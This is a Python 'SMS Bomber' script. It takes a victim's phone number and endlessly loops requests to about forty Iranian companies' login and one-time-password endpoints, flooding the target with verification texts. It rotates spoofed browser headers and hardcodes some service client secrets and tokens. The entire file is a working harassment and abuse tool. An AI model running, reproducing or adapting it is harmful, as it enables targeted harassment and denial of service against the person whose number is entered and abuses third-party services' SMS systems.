import os
os.system("pip install requests")
os.system("clear")
import random, requests

rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn = '\033[00;36m'
heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]
print (f"{lrd}[+] {lgn}Github{yw} ==============> {lgn}Github.com/esfelurm")
print (f"{lrd}[+] {lgn}Telegram {yw}============> {lgn}@esfelurm")
print (f"{lrd}[+] {lgn}Api {yw}=================> {lgn}45")
print (f"       {cn}Script SMS Bomber .!   ")
print (f"{lrd}[!] {rd}Please do not use more than 10 minutes ")
print ("")
random_head = random.choice(heads)
name = input(f"{lrd} [%] {lgn}Enter name : {cn}")
print ("")
esfelurm = input(f"""{lrd}┌─<({cn}SMS{gn}@esfelurm{lrd})-{yw}[~]{lrd}>
└─< ({gn}Number{lrd}){pe}* {lrd}>──» : {cn}""")
print (f"{pe}____________________________________")
print (f"{rd}[!]{lrd} {name} {lgn}Destroying {pe}Number : {yw}{esfelurm} !!!")
print (f"{rd}[~] {gn}start {lgn}$M$ {lrd}BOMBER {yw}to {pe}number : {cn}{esfelurm}")
print (f"{pe}____________________________________")
api0 = 'https://api.divar.ir/v5/auth/authenticate'
api1 = 'https://api.tapsi.cab/api/v2/user'
api2 = 'https://messengerg2c42.iranlms.ir/'
api3 = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
api4 = 'https://web.emtiyaz.app/json/login'
api5 = 'https://bama.ir/signin-checkforcellnumber'
api6 = 'https://ws.alibaba.ir/api/v3/account/mobile/otp'
api7 = 'https://api.chartex.net/api/v2/user/validate'
#get
apI = f'https://api.binjo.ir/api/panel/get_code/{esfelurm}'
apI1 = f'https://core.gap.im/v1/user/add.json?mobile={esfelurm}'
apI2 = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{esfelurm}'
apI3 = f'https://cms.dg.land/api-frontend/Authenticate/GetVerificationCode?mobileNumber={esfelurm}'
apI4 = f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{esfelurm}/sms?cCode='
apI5 = f'https://etma.ir/fa/Account/IsExistUserName?userName={esfelurm}'
apI6 = f'https://api.digighate.com/user/code?phone={esfelurm}'
apI7 = f'https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail={esfelurm}&source=2&sendTokenIfNot=true'
apI8 = f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{esfelurm}/sms?cCode=+98'
apI9 = f"https://behandam.kermany.com/fitamin-central-service/api/fitamin/v2/register/status?mobile={esfelurm}"
apI10 = f"https://filmnet.ir/api-v2/access-token/users/{esfelurm}/otp"
api8 = 'https://www.digikala.com/ajax/users/login-with-otp/send-confirm-code/'
api9 = 'https://drdr.ir/api/registerEnrollment/verifyMobile'
api10 = 'https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest'
api11 = 'https://core.gapfilm.ir/api/v3.1/Account/Login'
api12 = 'https://app.espard.com/api/v1/auth/identify-by-mobile'
api13 = 'https://a4baz.com/api/web/login'
api14 = 'https://taraazws.jabama.com/api/v4/account/send-code'
api15 = 'https://www.tebinja.com/api/v1/users'
api16 = 'https://api2.anten.ir/users'
api17 = 'https://api.doctoreto.com/api/web/patient/v1/accounts/register'
api18 = 'https://next.zarinpal.com/api/oauth/initialize'
api19 = 'https://api.mobit.ir/api/web/v8/register/register'
api20 = 'https://dayanshop.com/Auth/CheckPhoneNumber'
api21 = 'https://api-react.okala.com/C/CustomerAccount/OTPRegister'
api22 = 'https://restcore.bimeh.com/v1/authentication'
api23 = 'https://diginext.ir/register/send-sms'
api24 = 'https://api.digikalajet.ir/user/login-register/'
api25 = 'https://app.mydigipay.com/digipay/api/users/send-sms'
api26 = 'https://app.itoll.ir/api/v1/auth/login'
api27 = 'https://mobapi.banimode.com/api/v2/auth/request'
api28 = 'https://tj8.ir/auth/register'
api29 = 'https://mamifood.org/Registration.aspx/IsUserAvailable'
api30 = 'https://restaurant.delino.com/user/register'
api31 = 'https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile'
api32 = 'https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request'
api33 = 'https://virgool.io/api/v1.4/auth/verify'
api34 = 'https://www.sheypoor.com/api/v10.0.0/auth/send'
req0 = {"phone": esfelurm}
req1 = {"credential":{"phoneNumber":esfelurm,"role":"PASSENGER"}}
req2 = {"api_version":"3","method":"sendCode","data":{"phone_number":esfelurm,"send_type":"SMS"}}
req3 = {"phone":esfelurm}
#
req4 = "send=1&cellphone="+esfelurm
req5 = "cellNumber="+esfelurm
#
req6 = {"phoneNumber":esfelurm}
req7 =  {"mobile":esfelurm,"country_code":"IR","provider_code":"RUBIKA"}
req8 = {"phone":esfelurm}
req9 = {"credential":{"phoneNumber":esfelurm,"role":"PASSENGER"}}
req10 = {"properties":{"language":2,"clientID":"8vp51nm2c3t4kagbefajo4cyj6z6slhv","deviceID":"8vp51nm2c3t4kagbefajo4cyj6z6slhv","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":esfelurm}}}
req11 = {"phone":esfelurm}
req12 = {"data":{"mobile":esfelurm},"oneSignalPlayerId":"","appVersion":"2.0.0","deviceId":"01B30DE7-EC61-438A-BDB3-FC6910AE7E5E","deviceInfo":"x86_64","deviceToken":"","clientId":"com.espard.customer","platform":"web","osVersion":"10.2","timeZone":"GMT+3:30","time":"1630723653780"}
req13 = {"cellphone":esfelurm}
req14 = {"mobile":esfelurm}
req15 = {"username":esfelurm,"captchaHash":"","captchaValue":""}
req16 = {"phone":esfelurm}
req17 = {"mobile":esfelurm}
req18 = {"username":esfelurm}
req19 = {"number":esfelurm}
req20 = {"phoneNumber":esfelurm,"AuthenticationMode":1}
req21 = {"mobile":esfelurm}
req22 = {"MobileNumber":esfelurm,"type":""}
req23 = {"phone":esfelurm}
req24 = {"phone":esfelurm}
req25 = {"cellNumber":esfelurm,"device":{"deviceId":"f227ed1a-3ddf-4f42-bbea-606440e1ccb8","deviceModel":"WEB_BROWSER","deviceAPI":"WEB_BROWSER","osName":"WEB"}}
req26 = {"mobile":esfelurm}
req27 = {"phone":esfelurm,"headers":{"Content-Type":"application/x-www-form-urlencoded","Accept":"application/json"}}
req28 = {"mobile":esfelurm}
req29 = { 'cellphone':esfelurm}
req30 = {"apiToken":"WTKnmBBIpjL8kcOo7YGD0qkaa6p06bVER9IMUNsyVOj9J2AMlmjESWhqtuNqWBNN","clientSecret":"aINO67nX5aCs5e7382XQJZkYbROBBewt","device":"web","username":esfelurm}
req31 = {"mobile":esfelurm,"country_code":"+98"}
req32 = {"UserName":esfelurm}
req33 = {"method":"phone","identifier":esfelurm}
req34 = {"username":esfelurm}
while True:
    Req0 = requests.post(api0, json=req0, headers=random_head)
    if Req0.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req1 = requests.post(api1, json=req1, headers=random_head)
    if Req1.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req2 = requests.post(api2, json=req2, headers=random_head)
    if Req2.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req3 = requests.post(api3, json=req3, headers=random_head)
    if Req3.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req6 = requests.post(api6, json=req6, headers=random_head)
    if Req6.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req7 = requests.post(api7, json=req7, headers=random_head)
    if Req7.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req8 = requests.get(apI, headers=random_head)
    if Req8.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req9 = requests.get(apI1, headers=random_head)
    if Req9.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req10 = requests.get(apI2, headers=random_head)
    if Req10.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req11 = requests.get(apI3, headers=random_head)
    if Req11.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req12 = requests.get(apI4, headers=random_head)
    if Req12.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req13 = requests.post(api8, json=req8, headers=random_head)
    if Req13.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req14 = requests.post(api9, json=req9, headers=random_head)
    if Req14.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req15 = requests.post(api10, json=req10, headers=random_head)
    if Req15.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req16 = requests.post(api11, json=req11, headers=random_head)
    if Req16.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req17 = requests.post(api12, json=req12, headers=random_head)
    if Req17.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req18 = requests.post(api13, json=req13, headers=random_head)
    if Req18.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req19 = requests.post(api14, json=req14, headers=random_head)
    if Req19.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req20 = requests.post(api15, json=req15, headers=random_head)
    if Req20.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req21 = requests.post(api16, json=req16, headers=random_head)
    if Req21.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req22 = requests.post(api17, json=req17, headers=random_head)
    if Req22.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req23 = requests.post(api18, json=req18, headers=random_head)
    if Req23.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req24 = requests.post(api19, json=req19, headers=random_head)
    if Req24.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req25 = requests.post(api20, json=req20, headers=random_head)
    if Req25.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req26 = requests.post(api21, json=req21, headers=random_head)
    if Req26.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req27 = requests.post(api22, json=req22, headers=random_head)
    if Req27.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req28 = requests.post(api23, json=req23, headers=random_head)
    if Req28.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req29 = requests.post(api24, json=req24, headers=random_head)
    if Req29.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req30 = requests.post(api25, json=req25, headers=random_head)
    if Req30.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req31 = requests.post(api26, json=req26, headers=random_head)
    if Req31.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req32 = requests.post(api27, json=req27, headers=random_head)
    if Req32.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req33 = requests.get(apI5, headers=random_head)
    if Req33.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req34 = requests.get(apI6, headers=random_head)
    if Req34.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req35 = requests.post(api29, json=req29, headers=random_head)
    if Req35.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req36 = requests.post(api30, json=req30, headers=random_head)
    if Req36.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req37 = requests.post(api31, json=req31, headers=random_head)
    if Req37.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req38 = requests.post(api32, json=req32, headers=random_head)
    if Req38.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req39 = requests.post(api33, json=req33, headers=random_head)
    if Req39.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req40 = requests.post(api34, json=req34, headers=random_head)
    if Req40.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req41 = requests.get(apI6, headers=random_head)
    if Req41.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req42 = requests.get(apI7, headers=random_head)
    if Req42.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req43 = requests.get(apI8, headers=random_head)
    if Req43.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
    Req44 = requests.get(apI9, headers=random_head)
    if Req44.status_code == 200:
        print (f"{rd}[{lgn}+{rd}]{gn}Sent")
    else:
        print (f"{lrd}[{lgn}-{lrd}]{rd}No sent")
